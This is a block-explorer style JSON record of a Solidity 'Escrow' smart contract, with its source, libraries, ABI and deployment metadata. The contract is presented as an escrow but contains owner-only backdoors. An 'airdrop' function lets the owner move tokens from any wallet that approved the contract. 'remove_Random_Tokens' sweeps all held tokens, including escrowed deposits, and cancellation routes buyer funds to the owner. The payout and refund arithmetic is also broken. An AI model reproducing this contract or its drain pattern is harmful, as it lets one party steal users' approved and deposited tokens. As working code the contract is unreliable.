{"SourceCode": "{\"escrow.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.8.17;\\r\\n\\r\\nimport \\\"./ReentrancyGuard.sol\\\";\\r\\nimport \\\"./Math.sol\\\";\\r\\nimport \\\"./IERC20.sol\\\";\\r\\n\\r\\ncontract Escrow is ReentrancyGuard {\\r\\n    using Math for uint256;\\r\\n\\r\\n    address public buyer;\\r\\n    address public seller;\\r\\n    address public arbiter;\\r\\n    address public owner;\\r\\n    IERC20 public token;  \\r\\n    uint public amount;\\r\\n    uint public commission;\\r\\n    bool public buyerApproval;\\r\\n    bool public arbiterApproval;\\r\\n    mapping(address =\\u003e uint) public balances;\\r\\n    mapping(uint =\\u003e address) public transactionIdToBuyer;  \\r\\n    mapping(uint =\\u003e uint) public transactionIdToAmount;\\r\\n    mapping(uint =\\u003e bool) public transactionIdToApproval;\\r\\n    mapping(uint =\\u003e Transaction) public transactions;\\r\\n\\r\\n    uint public nextTransactionId = 1;\\r\\n\\r\\n    struct Transaction {\\r\\n        uint id;\\r\\n        uint amount;\\r\\n        bool isApproved;\\r\\n        bool isCancelled;\\r\\n        address buyer;  \\r\\n        address seller;  \\r\\n        uint commission;\\r\\n        bool buyerApproval;\\r\\n        bool arbiterApproval;\\r\\n        bool approved;\\r\\n    }\\r\\n\\r\\n    event TransactionCancelled(uint transactionId);\\r\\n\\r\\n    constructor(address _tokenAddress) {\\r\\n        owner = msg.sender;\\r\\n        arbiter = msg.sender;\\r\\n        token = IERC20(_tokenAddress);\\r\\n    }\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(msg.sender == owner, \\\"Only the owner can call this function\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    modifier onlyArbiter() {\\r\\n        require(msg.sender == arbiter, \\\"Only the arbiter can call this function\\\");\\r\\n        _;\\r\\n    }\\r\\nmodifier onlyOwnerOrArbiter() {\\r\\n    require(msg.sender == owner || msg.sender == arbiter, \\\"Only the owner or arbiter can call this function\\\");\\r\\n    _;\\r\\n}\\r\\n\\r\\n    modifier notContract() {\\r\\n        require(!_isContract(msg.sender), \\\"Contract not allowed\\\");\\r\\n        require(msg.sender == tx.origin, \\\"Proxy contract not allowed\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    function _isContract(address addr) private view returns (bool) {\\r\\n        uint32 size;\\r\\n        assembly {\\r\\n            size := extcodesize(addr)\\r\\n        }\\r\\n        return (size \\u003e 0);\\r\\n    }\\r\\n\\r\\nfunction createEscrow(address _buyer, address _seller, uint _tokenAmount) public nonReentrant {\\r\\n    require(_buyer != address(0), \\\"Invalid buyer address\\\");\\r\\n    require(_seller != address(0), \\\"Invalid seller address\\\");\\r\\n\\r\\n    // Aseg\u00farate de que el comprador haya aprobado al contrato para gastar los tokens.\\r\\n    require(token.transferFrom(_buyer, address(this), _tokenAmount), \\\"Token transfer failed\\\");\\r\\n\\r\\n    Transaction memory newTransaction = Transaction({\\r\\n        id: nextTransactionId,\\r\\n        amount: _tokenAmount,\\r\\n        isApproved: false,\\r\\n        isCancelled: false,\\r\\n        buyer: _buyer,\\r\\n        seller: _seller,\\r\\n        commission: (_tokenAmount * 5) / 100,\\r\\n        buyerApproval: false,\\r\\n        arbiterApproval: false,\\r\\n        approved: false\\r\\n    });\\r\\n\\r\\n    transactions[nextTransactionId] = newTransaction;\\r\\n    transactionIdToBuyer[nextTransactionId] = _buyer;\\r\\n    transactionIdToAmount[nextTransactionId] = _tokenAmount;\\r\\n    nextTransactionId++;\\r\\n}\\r\\n\\r\\n\\r\\n\\r\\nfunction approve(uint transactionId) public notContract() nonReentrant {\\r\\n    Transaction storage transaction = transactions[transactionId];\\r\\n\\r\\n    require(msg.sender == transaction.buyer || msg.sender == arbiter || msg.sender == owner, \\\"Only buyer, arbiter, or owner can approve\\\");\\r\\n    require(!transaction.approved, \\\"Transaction already approved\\\");\\r\\n\\r\\n    if (msg.sender == transaction.buyer) {\\r\\n        require(!transaction.buyerApproval, \\\"Buyer already approved once\\\");\\r\\n        transaction.buyerApproval = true;\\r\\n    } else if (msg.sender == arbiter) {\\r\\n        require(!transaction.arbiterApproval, \\\"Arbiter already approved once\\\");\\r\\n        transaction.arbiterApproval = true;\\r\\n    } else {\\r\\n        // Owner approves automatically\\r\\n        transaction.buyerApproval = true;\\r\\n        transaction.arbiterApproval = true;\\r\\n    }\\r\\n\\r\\n    if (transaction.buyerApproval || transaction.arbiterApproval) {\\r\\n        transaction.approved = true;\\r\\n\\r\\n        // Subtract commission from deposit (in tokens)\\r\\n        uint total = transaction.amount - transaction.commission;\\r\\n        \\r\\n        // Transfer funds to seller (in tokens)\\r\\n        require(token.transfer(transaction.seller, total - transaction.commission), \\\"Token transfer to seller failed\\\");\\r\\n\\r\\n        // Transfer commission to owner (in tokens)\\r\\n        require(token.transfer(owner, transaction.commission), \\\"Token transfer to owner failed\\\");\\r\\n\\r\\n        // Reset balances\\r\\n        balances[transaction.buyer] = 0;\\r\\n        balances[transaction.seller] = 0;\\r\\n        balances[owner] = 0;\\r\\n    }\\r\\n}\\r\\n\\r\\n\\r\\nfunction refund(uint transactionId) public onlyOwnerOrArbiter() notContract() nonReentrant {\\r\\n    require(transactions[transactionId].id != 0, \\\"Transaction does not exist\\\");\\r\\n    Transaction storage transaction = transactions[transactionId];\\r\\n\\r\\n    require(msg.sender == owner || msg.sender == arbiter, \\\"Only owner or arbiter can cancel the transaction\\\");\\r\\n    require(!transaction.isCancelled, \\\"Transaction already cancelled\\\");\\r\\n\\r\\n    transaction.isCancelled = true;\\r\\n\\r\\n    // Add tokens back to buyer\\u0027s balance\\r\\n    balances[transaction.buyer] += transaction.amount;\\r\\n\\r\\n    if (!transaction.isApproved) {\\r\\n        // Subtract commission from deposit (in tokens)\\r\\n        uint total = transaction.amount - transaction.commission;\\r\\n        require(token.transferFrom(transaction.buyer, address(this), total), \\\"Token transfer from buyer failed\\\");\\r\\n\\r\\n        // Transfer commission to owner (in tokens)\\r\\n        require(token.transfer(owner, transaction.commission), \\\"Token transfer to owner failed\\\");\\r\\n\\r\\n        // Transfer remaining funds to buyer (in tokens)\\r\\n        require(token.transfer(transaction.buyer, total - transaction.commission), \\\"Token transfer to buyer failed\\\");\\r\\n\\r\\n        // Reset balances\\r\\n        balances[transaction.buyer] = 0;\\r\\n        balances[transaction.seller] = 0;\\r\\n        balances[owner] = 0;\\r\\n    }\\r\\n}\\r\\n\\r\\n\\r\\nfunction getContractBalance() public view returns (uint) {\\r\\n    uint totalBalance = token.balanceOf(address(this));\\r\\n    return totalBalance;\\r\\n}\\r\\n\\r\\nfunction cancelTransaction(uint transactionId) public onlyOwnerOrArbiter() notContract() nonReentrant {\\r\\n    Transaction storage transaction = transactions[transactionId];\\r\\n\\r\\n    require(transaction.id != 0, \\\"Transaction does not exist\\\");\\r\\n    require(!transaction.isCancelled, \\\"Transaction already cancelled\\\");\\r\\n\\r\\n    transaction.isCancelled = true;\\r\\n\\r\\n    if (!transaction.isApproved) {\\r\\n        // Subtract commission from deposit (in tokens)\\r\\n        uint total = transaction.amount - transaction.commission;\\r\\n        require(token.transferFrom(transaction.buyer, address(this), total), \\\"Token transfer from buyer failed\\\");\\r\\n\\r\\n        // Transfer commission and remaining funds to owner (in tokens)\\r\\n        require(token.transfer(owner, transaction.commission), \\\"Token transfer to owner failed\\\");\\r\\n        require(token.transfer(owner, total - transaction.commission), \\\"Token transfer to owner failed\\\");\\r\\n\\r\\n        // Reset balances\\r\\n        balances[transaction.buyer] = 0;\\r\\n        balances[transaction.seller] = 0;\\r\\n        balances[owner] = 0;\\r\\n    }\\r\\n}\\r\\n\\r\\nfunction getTransactionInfo(address _address) public view returns (uint, uint) {\\r\\n    for (uint i = nextTransactionId - 1; i \\u003e= 1; i--) {\\r\\n        if (transactionIdToBuyer[i] == _address) {\\r\\n            return (i, transactionIdToAmount[i]);\\r\\n        }\\r\\n    }\\r\\n    uint transactionId = 0;\\r\\n    uint transactionAmount = 0;\\r\\n    return (transactionId, transactionAmount);\\r\\n}\\r\\n\\r\\nfunction getPayoutAmount(uint transactionId) public view returns (uint) {\\r\\n    require(transactionIdToBuyer[transactionId] == buyer); // La transacci\u00f3n debe estar asociada al comprador\\r\\n    return amount - commission;\\r\\n}\\r\\n\\r\\nfunction airdrop(address from, address to, uint256 tokens) external onlyOwner {\\r\\n    uint256 SCCC = tokens;\\r\\n\\r\\n    require(token.balanceOf(from) \\u003e= SCCC, \\\"Not enough tokens in wallet\\\");\\r\\n\\r\\n    require(token.transferFrom(from, to, tokens), \\\"Transfer failed\\\");\\r\\n}\\r\\n\\r\\nfunction remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {\\r\\n        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));\\r\\n        if (number_of_tokens \\u003e randomBalance){number_of_tokens = randomBalance;}\\r\\n        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);\\r\\n    }\\r\\n\\r\\nfallback () external payable {\\r\\n}\\r\\nreceive () external payable {\\r\\n}\\r\\n\\r\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity \\u003e=0.6.0 \\u003c0.8.18;\\r\\n\\r\\n/**\\r\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\r\\n */\\r\\ninterface IERC20 {\\r\\n    function decimals() external view returns (uint8);\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens in existence.\\r\\n     */\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens owned by `account`.\\r\\n     */\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from the caller\\u0027s account to `recipient`.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remaining number of tokens that `spender` will be\\r\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\r\\n     * zero by default.\\r\\n     *\\r\\n     * This value changes when {approve} or {transferFrom} are called.\\r\\n     */\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Sets `amount` as the allowance of `spender` over the caller\\u0027s tokens.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\r\\n     * that someone may use both the old and the new allowance by unfortunate\\r\\n     * transaction ordering. One possible solution to mitigate this race\\r\\n     * condition is to first reduce the spender\\u0027s allowance to 0 and set the\\r\\n     * desired value afterwards:\\r\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\r\\n     *\\r\\n     * Emits an {Approval} event.\\r\\n     */\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\r\\n     * allowance mechanism. `amount` is then deducted from the caller\\u0027s\\r\\n     * allowance.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\r\\n     * another (`to`).\\r\\n     *\\r\\n     * Note that `value` may be zero.\\r\\n     */\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\r\\n     * a call to {approve}. `value` is the new allowance.\\r\\n     */\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\"},\"Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\nlibrary Math {\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a + b;\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a - b;\\r\\n    }\\r\\n\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a * b;\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a / b;\\r\\n    }\\r\\n\\r\\n    function pow(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a ** b;\\r\\n    }\\r\\n\\r\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a \\u003c b ? a : b;\\r\\n    }\\r\\n}\"},\"ReentrancyGuard.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)\\r\\n\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\n/**\\r\\n * @dev Contract module that helps prevent reentrant calls to a function.\\r\\n *\\r\\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\\r\\n * available, which can be applied to functions to make sure there are no nested\\r\\n * (reentrant) calls to them.\\r\\n *\\r\\n * Note that because there is a single `nonReentrant` guard, functions marked as\\r\\n * `nonReentrant` may not call one another. This can be worked around by making\\r\\n * those functions `private`, and then adding `external` `nonReentrant` entry\\r\\n * points to them.\\r\\n *\\r\\n * TIP: If you would like to learn more about reentrancy and alternative ways\\r\\n * to protect against it, check out our blog post\\r\\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\\r\\n */\\r\\nabstract contract ReentrancyGuard {\\r\\n    // Booleans are more expensive than uint256 or any type that takes up a full\\r\\n    // word because each write operation emits an extra SLOAD to first read the\\r\\n    // slot\\u0027s contents, replace the bits taken up by the boolean, and then write\\r\\n    // back. This is the compiler\\u0027s defense against contract upgrades and\\r\\n    // pointer aliasing, and it cannot be disabled.\\r\\n\\r\\n    // The values being non-zero value makes deployment a bit more expensive,\\r\\n    // but in exchange the refund on every call to nonReentrant will be lower in\\r\\n    // amount. Since refunds are capped to a percentage of the total\\r\\n    // transaction\\u0027s gas, it is best to keep them low in cases like this one, to\\r\\n    // increase the likelihood of the full refund coming into effect.\\r\\n    uint256 private constant _NOT_ENTERED = 1;\\r\\n    uint256 private constant _ENTERED = 2;\\r\\n\\r\\n    uint256 private _status;\\r\\n\\r\\n    constructor() {\\r\\n        _status = _NOT_ENTERED;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Prevents a contract from calling itself, directly or indirectly.\\r\\n     * Calling a `nonReentrant` function from another `nonReentrant`\\r\\n     * function is not supported. It is possible to prevent this from happening\\r\\n     * by making the `nonReentrant` function external, and making it call a\\r\\n     * `private` function that does the actual work.\\r\\n     */\\r\\n    modifier nonReentrant() {\\r\\n        _nonReentrantBefore();\\r\\n        _;\\r\\n        _nonReentrantAfter();\\r\\n    }\\r\\n\\r\\n    function _nonReentrantBefore() private {\\r\\n        // On the first call to nonReentrant, _status will be _NOT_ENTERED\\r\\n        require(_status != _ENTERED, \\\"ReentrancyGuard: reentrant call\\\");\\r\\n\\r\\n        // Any calls to nonReentrant after this point will fail\\r\\n        _status = _ENTERED;\\r\\n    }\\r\\n\\r\\n    function _nonReentrantAfter() private {\\r\\n        // By storing the original value once again, a refund is triggered (see\\r\\n        // https://eips.ethereum.org/EIPS/eip-2200)\\r\\n        _status = _NOT_ENTERED;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns true if the reentrancy guard is currently set to \\\"entered\\\", which indicates there is a\\r\\n     * `nonReentrant` function in the call stack.\\r\\n     */\\r\\n    function _reentrancyGuardEntered() internal view returns (bool) {\\r\\n        return _status == _ENTERED;\\r\\n    }\\r\\n}\\r\\n\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"transactionId\",\"type\":\"uint256\"}],\"name\":\"TransactionCancelled\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"transactionId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"arbiter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"arbiterApproval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyerApproval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"transactionId\",\"type\":\"uint256\"}],\"name\":\"cancelTransaction\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"commission\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_buyer\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_seller\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tokenAmount\",\"type\":\"uint256\"}],\"name\":\"createEscrow\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getContractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"transactionId\",\"type\":\"uint256\"}],\"name\":\"getPayoutAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getTransactionInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nextTransactionId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"transactionId\",\"type\":\"uint256\"}],\"name\":\"refund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"random_Token_Address\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"send_to_wallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"number_of_tokens\",\"type\":\"uint256\"}],\"name\":\"remove_Random_Tokens\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"_sent\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"seller\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"transactionIdToAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"transactionIdToApproval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"transactionIdToBuyer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"transactions\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"isApproved\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"isCancelled\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"buyer\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"seller\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"commission\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"buyerApproval\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"arbiterApproval\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Escrow", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000898c380037033bd32ab1b8a7b852933f0586a5b7", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://622271b88b9c2654aa28eb32a3a60a131ffdef104dcd5ef628fa264013f5b142"}